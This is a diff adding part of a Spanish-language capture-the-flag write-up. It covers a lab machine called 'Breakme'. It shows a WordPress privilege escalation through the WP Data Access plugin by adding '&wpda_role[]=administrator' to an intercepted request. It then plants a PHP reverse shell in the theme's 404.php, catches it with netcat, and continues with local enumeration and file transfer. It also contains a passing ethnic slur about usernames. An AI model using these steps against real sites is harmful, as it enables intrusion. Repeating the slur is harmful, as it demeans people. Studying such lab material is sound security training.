@@ -146,6 +146,207 @@ Estamos dentro del wordpress con bob, ahora toca enumerar y no olvidarnos del pl
 
 Enumerando el wordpress la verdad que no he encontrado una mierda, voy a buscar info de los plugins de wordpress
 
+POC:
+
+https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/
+
+Explicación:
+
+Parece ser que el plugin Wp_data (Anteriormente reconocido) es vulnerable a una escala de privilegios en versiones superiores y incluyendo la 5.3.7. Simplemente cambiado la funcion "multiple_roles_update" hace que el atacante (nosotros) sea posible autentificarnos como administradores. 
+
+Deberemos irnos al update de perfil e interceptar la Request, posteriormente añadir el parametro
+
+```
+&wpda_role[]=administrator
+```
+
+Dando un fallo y forwardeando la request
+
+Para la gente que no sepa configurar un Burp Suite:
+
+- Primero os instalai sel Burp Suite comunity edition
+- Una vez instalado necesitaremos un proxy, en mi caso "foxy proxy"
+- Añadimos un proxy apuntando a nuestra ip local (127.0.0.1) por el puerto 8080
+
+![image](https://github.com/user-attachments/assets/e41051f5-cd4f-4222-a8fa-533d842668a3)
+
+- Lo guardamos, iniciamos BURP SUITE, lo activamos y nos vamos a dicha ip http://127.0.0.1:8080
+
+![image](https://github.com/user-attachments/assets/10b0e031-f463-4cc3-a584-051f0586f498)
+
+- Pulsais sobre CA Certificate y lo descargais
+- Os vais al navegador - configuración - buscais certificate
+
+![image](https://github.com/user-attachments/assets/6c8ebb8f-043c-485f-a967-6202d5ec3bf6)
+
+- La importais y ale (Importante que le deis veracidad a todo)
+
+Ya teneis un proxy de consultas en web
+
+Una vez tengamos todo configurado coguemos la consulta que necesitamos de update
+
+![image](https://github.com/user-attachments/assets/ba63b77c-ec35-4347-8259-cceeb3985852)
+
+Pulsamos para pasarlo "forward"
+
+Si pulsais forward hahy una cosa muy graciosaa, reventais la web entera y podeis reventar a updates jeje
+
+![image](https://github.com/user-attachments/assets/8e351966-097f-440b-a66a-65925bdc9c82)
+
+Pero bueno dejando esta tontería vereis que ahora teneis admin
+
+![image](https://github.com/user-attachments/assets/36d4efd8-e6c9-48ae-9c5f-702b12daba63)
+
+Que toca ahora???
+
+# Explotación
+
+Pues chicos como en todo wordpress vamos a hacer una rev shell super simple, nos vamos al tema en cuestión, coguemos cualquier php y lo cambiamos por una rev shell y luego apuntamos a el, yo suelo coger el 404 porque basicamente da igual donde apuntes que siempre te va a tocar ese.
+
+Ya sabéis el tema One y el 404.php
+
+![image](https://github.com/user-attachments/assets/8a18d459-8238-4a36-a3d5-f11648c4a588)
+
+Nos vamos a cualquier web que haga revshells como pentest monkey la cambiamos por el código
+
+![image](https://github.com/user-attachments/assets/a21aaac1-6f37-493d-bb45-8fbe943e42f9)
+
+Y ale a ponerse en escucha ya como querais con nc o rlwrap
+
+Ahora pues apuntamos no se o al mismo lugar donde esta que ya lo sabemos o cualquier que sepamos que nos va a dar esa respuesta.
+
+```
+http://10.10.102.26/wordpress/wp-content/themes/twentytwentyone/404.php
+```
+
+```                                                                                         
+┌──(root㉿kali)-[~]
+└─# nc -lvnp 9000
+listening on [any] 9000 ...
+connect to [10.10.67.89] from (UNKNOWN) [10.10.102.26] 33704
+Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
+ 09:34:47 up 33 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (633): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Breakme:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@Breakme:/$ 
+```
+
+Una vez estamos dentro vamos a enumerar lo principal, usuarios, o para la gente mas llorica upgradearse la shell a mi no me importa la verdad.
+
+También podemos utilizar el mágico Linpeas, pero por ahora prefiero hacerlo más manual, si me aburro pues lo automatizare.
+
+```
+www-data@Breakme:/$ cat /etc/passwd
+cat /etc/passwd
+
+john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash
+youcef:x:1000:1000:youcef,17,17,17:/home/youcef:/bin/bash
+```
+
+- john y youcef tiene to el nombre moro su raza pero bueno no pasa nada
+
+Vamos a ver si tenemos permisos de algo en estos usuarios
+
+```
+ls -al
+total 32
+drwxr-xr-x  5 root   root  4096 Feb  3  2024 .
+drwxr-xr-x 18 root   root  4096 Aug 17  2021 ..
+drwxr-xr-x  4 john   john  4096 Aug  3  2023 john
+drwx------  2 root   root 16384 Aug 17  2021 lost+found
+drwxr-x---  4 youcef john  4096 Aug  3  2023 youcef
+```
+
+Vaya vaya parece ser que tenemos acceso a john pero na maas
+
+```
+www-data@Breakme:/home/john$ ls -al
+ls -al
+total 32
+drwxr-xr-x 4 john john 4096 Aug  3  2023 .
+drwxr-xr-x 5 root root 4096 Feb  3  2024 ..
+lrwxrwxrwx 1 john john    9 Aug  3  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 john john  220 Jul 31  2023 .bash_logout
+-rw-r--r-- 1 john john 3526 Jul 31  2023 .bashrc
+drwxr-xr-x 3 john john 4096 Jul 31  2023 .local
+-rw-r--r-- 1 john john  807 Jul 31  2023 .profile
+drwx------ 2 john john 4096 Feb  4  2024 internal
+-rw------- 1 john john   33 Aug  3  2023 user1.txt
+```
+
+Y aqui parece ser que el .bash lo tiene quitado el user1.txt no tenemos permisos. Por aquí poco podemos hacer
+
+El siguiente paso que podemos hacer o es enumerar servicios que corran en local o tareas, prefiero servicios porque es lo más rápido la verdad.
+
+```
+netstat -tulnp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
+```
+
+Si os fijais parece ser que tenemos 2 puertos abeirtos corriendo en local el 3306 y el 9999, si no teniais estos conocimientos se puede hacer un curl a esto desde la misma máquina para ver que puede ser, curl nos referimos si tiene una web o algo alojada y si es así pues enumeramos bastante.
+
+Si haceis un curl a diferentes puertos podeis ver que el 9999 es una web. 
+
+![image](https://github.com/user-attachments/assets/d45a9427-cb9a-4961-804f-7970c77be1e8)
+
+Una web pero que web?
+
+Por lo que leo en el HTML parece ser 3 cajitas para meter inputs como usuario que da resultados, en el que uno checkea un target, otro un usuario y otro un archivo. Puede ser interesante? pues tiene toda la pinta la verdad, pero... muy raro me parecería
+
+Vamos a enumerar primero servicios no vaya a ser que nos montemos un tunel para nada.
+
+En este caso vamos a utilizar pspy 
+
+https://github.com/DominicBreuker/pspy
+
+Normalmente en estos casos, es muy simple pasar este archivo a la máquina local ya sea desde el mismo wordpress o como queramos, normalmente lo solemos meter en /tmp ya que aqui solemos tener permisos
+
+Normalmente para pasar este tipo de archivos es muy simple, nos montamos una web con python
+
+```
+pytho3 -m http.server
+```
+
+y desde ahi ya metemos un wget desde nuestra máquina víctima y nos descargamos el archivo
+
+![image](https://github.com/user-attachments/assets/b0eb5844-80b4-470d-9b8b-834097f6c512)
+
+Si nos fijamos a lo tonto teniamos razon con el puerto abierto y parece ser que hay un usuario UID=1002 corriendo en este proceso jiji
+
+```
+john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash
+```
+
+Creo que ya sabemos por donde tirar no?
+
+a Pivotear
+
+Voy a utilizar ligolo-ng
+
+https://github.com/nicocha30/ligolo-ng
+
+
+
+
+
+
+
+
+
 
 
 
